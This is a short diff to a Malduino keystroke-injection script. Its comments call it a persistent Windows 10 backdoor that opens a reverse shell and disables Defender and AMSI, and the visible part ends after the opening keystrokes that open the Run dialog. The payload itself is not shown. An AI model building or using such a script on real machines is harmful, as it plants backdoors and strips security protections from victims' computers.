@@ -1,4 +1,6 @@
-REM use taskmgnt/winmgnt (ATAT persistence > Windows DBD Reverse Shell) method along with Viss' defender/AMSI disable command enhanced with defender crippling magic of my own for win10 
+REM use taskmgnt/winmgnt (ATAT persistence > Windows DBD Reverse Shell) method along with Viss' defender/AMSI disable command
+REM enhanced with defender crippling magic of my own for win10 
+REM Malduino_Win10_Persistent_Backdoor_With_Special_Sauce
 DELAY 2000
 ESCAPE
 GUI r
